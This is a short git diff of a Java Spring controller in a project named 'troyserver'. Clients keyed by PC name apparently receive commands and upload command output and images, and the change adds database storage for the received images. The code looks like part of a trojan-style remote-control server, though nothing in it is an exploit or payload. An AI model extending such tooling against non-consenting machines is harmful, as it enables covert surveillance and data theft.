@@ -1,10 +1,7 @@
 package ch.lebois.troyserver.controller;
 
-import ch.lebois.troyserver.ImageService;
-import ch.lebois.troyserver.data.Client;
-import ch.lebois.troyserver.data.Message;
-import ch.lebois.troyserver.data.ClientRepository;
-import ch.lebois.troyserver.data.MessageRepository;
+import ch.lebois.troyserver.data.*;
+import ch.lebois.troyserver.service.ImageService;
 import org.springframework.stereotype.Controller;
 import org.springframework.web.bind.annotation.PathVariable;
 import org.springframework.web.bind.annotation.RequestMapping;
@@ -23,14 +20,16 @@ public class ServerReceiverController {
 
     private ClientRepository clientRepository;
     private MessageRepository messageRepository;
+    private ImageRepository imageRepository;
 
     private ImageService imageService;
 
     public ServerReceiverController(ClientRepository clientRepository, MessageRepository messageRepository,
-                                    ImageService imageService) {
+                                    ImageService imageService, ImageRepository imageRepository) {
         this.clientRepository = clientRepository;
         this.messageRepository = messageRepository;
         this.imageService = imageService;
+        this.imageRepository = imageRepository;
     }
 
     @RequestMapping(value = {"{client}"}, method = RequestMethod.GET)
@@ -61,10 +60,24 @@ public class ServerReceiverController {
                 client.setCommands("");
                 break;
             case "imgend":
+
+                Message loadingMessage = new Message();
+                loadingMessage.setPcNameFk(clientParam);
+                loadingMessage.setType("commandout");
+                loadingMessage.setText("Creating Img");
+                messageRepository.save(loadingMessage);
+
+                String fileName = imageService.getImage(bytes, clientParam);
+
+                Image image = new Image();
+                image.setPcNameFk(clientParam);
+                image.setName(fileName);
+                imageRepository.save(image);
+
                 Message imgMessage = new Message();
                 imgMessage.setPcNameFk(clientParam);
                 imgMessage.setType(typeParam);
-                imgMessage.setText("Saved img: " + imageService.getImage(bytes, clientParam));
+                imgMessage.setText("Saved img: " + fileName);
                 messageRepository.save(imgMessage);
                 break;
             default:
